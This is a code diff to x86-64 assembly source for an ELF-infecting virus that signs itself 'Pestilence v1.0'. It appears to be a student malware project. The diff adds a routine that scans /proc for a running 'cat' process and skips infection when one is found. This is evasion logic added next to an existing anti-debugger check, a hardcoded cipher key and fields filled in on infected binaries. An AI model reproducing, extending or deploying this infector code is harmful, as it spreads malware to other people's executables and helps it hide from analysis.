@@ -87,6 +87,10 @@ can_run_infection:
 	cmp rax, 0					; if (_ret < 0)
 	jl .debugged					; 	goto .debugged;
 
+	call check_process				; _ret = check_process();
+	cmp rax, 1					; if (_ret == !)
+	je .process					; 	goto .process;
+
 	; TODO: merge this uncipher with anti-debugger instructions
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
 	cmp rax, 0x0					; ...
@@ -107,6 +111,167 @@ can_run_infection:
 		call print_string			; ...
 		xor rax, rax				; return 0;
 		ret
+
+	.process:
+		lea rdi, [rel process_message]		; print_string(process_message);
+		call print_string			; ...
+		xor rax, rax				; return 0;
+		ret
+
+
+; int check_process();
+; rax check_process();
+check_process:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local fd:qword					; long fd;
+	%local cur_offset:qword				; long cur_offset;
+	%local read_bytes:qword				; long read_bytes;
+	%local cur_dirent:qword				; void *cur_dirent;
+	%local file_fd:qword				; long file_fd;
+	%local result:qword				; long result;
+	%xdefine proc_buffer rbp - %$localsize - BUFFER_SIZE	; uint8_t proc_buffer[BUFFER_SIZE];
+	%assign %$localsize %$localsize + BUFFER_SIZE		; ...
+	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
+	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
+	%xdefine file_buf rbp - %$localsize - BUFFER_SIZE	; uint8_t file_buf[BUFFER_SIZE];
+	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov byte [result], 0					; result = 0;
+
+	mov byte [proc_buffer], 0x2F			; proc_buffer = "/proc/";
+	mov byte [proc_buffer + 1], 0x70		; ...
+	mov byte [proc_buffer + 2], 0x72		; ...
+	mov byte [proc_buffer + 3], 0x6F		; ...
+	mov byte [proc_buffer + 4], 0x63		; ...
+	mov byte [proc_buffer + 5], 0x2F		; ...
+	mov byte [proc_buffer + 6], 0			; ...
+
+	mov rax, SYS_OPEN				; _ret = open(
+	lea rdi, [proc_buffer]				; folder_name,
+	mov rsi, O_RDONLY				; O_RDONLY,
+	xor rdx, rdx					; 0
+	syscall						; );
+	cmp rax, 0					; if (_ret < 0)
+	jl .end						; 	goto .end
+	mov [fd], rax					; fd = _ret;
+
+.begin_getdents_loop:					; while (true) {
+	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
+	mov rdi, [fd]					; 	fd,
+	lea rsi, [buf]					; 	buf,
+	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
+	syscall						; );
+
+	cmp rax, 0					; if (_ret <= 0)
+	jle .end_getdents_loop				;	 break;
+	mov [read_bytes], rax				; read_bytes = _ret;
+
+	xor rax, rax					; cur_offset = 0;
+	mov [cur_offset], rax				; ...
+
+.begin_treate_loop:					; do {
+	lea rax, [buf]					; cur_dirent = buf + cur_offset;
+	add rax, [cur_offset]				; ...
+	mov [cur_dirent], rax				; ...
+
+	lea rdi, [proc_buffer]				; buf = proc_buffer;
+	add rdi, 6					; buf += 6;
+	mov rsi, [cur_dirent]				; name = cur_dirent->d_name;
+	add rsi, linux_dirent64.d_name			; ...
+
+	.concat:
+		mov al, [rsi]				; c = *name;
+		cmp al, 0				; if (c == 0)
+		je .end_concat				; 	goto .end_concat
+		mov [rdi], al				; *buf = c;
+		inc rdi					; buf++;
+		inc rsi					; name++;
+		jmp .concat				; goto .concat
+
+	.end_concat:
+	
+	mov byte [rdi], 0x2F				; buf += '/comm'
+	mov byte [rdi + 1], 0x63			; ...
+	mov byte [rdi + 2], 0x6F			; ...
+	mov byte [rdi + 3], 0x6D			; ...
+	mov byte [rdi + 4], 0x6D			; ...
+	mov byte [rdi + 5], 0				; ...
+
+	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
+	add rax, linux_dirent64.d_reclen		; ...
+	xor rdi, rdi					; _reclen = *_reclen_ptr;
+	mov di, [rax]					; ...
+	add [cur_offset], rdi				; cur_offset += _reclen;
+
+	mov rax, SYS_OPEN				; _ret = open(
+	lea rdi, [proc_buffer]				; buf,
+	mov rsi, O_RDONLY				; O_RDONLY,
+	xor rdx, rdx					; 0
+	syscall						; );
+	cmp rax, 0					; if (_ret < 0)
+	jl .continue					; 	goto .continue
+	mov [file_fd], rax				; file_fd = _ret;
+
+	mov rax, SYS_READ				; _ret = read(
+	mov rdi, [file_fd]				; 	file_fd,
+	lea rsi, [file_buf]				; 	file_buf,
+	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
+	syscall						; );
+	cmp rax, 4					; if (_ret != 4)
+	jne .close_file					; 	goto .close_file
+
+	mov al, [file_buf]				; if (file_buf[0] != 'c')
+	cmp al, 'c'					; ...
+	jne .close_file					; 	goto .close_file
+
+	mov al, [file_buf + 1]				; if (file_buf[1] != 'a')
+	cmp al, 'a'					; ...
+	jne .close_file					; 	goto .close_file
+
+	mov al, [file_buf + 2]				; if (file_buf[2] != 't')
+	cmp al, 't'					; ...
+	jne .close_file					; 	goto .close_file
+
+	mov al, [file_buf + 3]				; if (file_buf[3] != '\n')
+	cmp al, 0x0A					; ...
+	jne .close_file					; 	goto .close_file
+
+	mov byte [result], 1					; result = 1;
+
+	.close_file:
+		mov rax, SYS_CLOSE				; close(file_fd);
+		mov rdi, [file_fd]				; ...
+		syscall						; );
+
+.continue:
+	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
+	cmp rax, [read_bytes]				; ...
+	je .end_treate_loop				; ...
+	jmp .begin_treate_loop				; ...
+.end_treate_loop:					; ...
+
+	jmp .begin_getdents_loop
+.end_getdents_loop:					; }
+
+	; Close folder
+	mov rax, SYS_CLOSE				; _ret = close(
+	mov rdi, [fd]					;	fd
+	syscall						; );
+
+.end:
+	mov rax, [result]				; return result;
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
 
 ; void print_string(char const *str);
 ; void print_string(rdi str);
@@ -274,7 +439,8 @@ elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 len_elf_64_magic: equ $ - elf_64_magic
 compressed_data_size2: dq 0x00				; Filled in infected
 key: db "S3cr3tK3y", 0
-debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
+debugged_message: db "DEBUG DETECTED ;)", 0
+process_message: db "Process detected ;)", 0
 ; never used but here to be copied in the binary
 signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
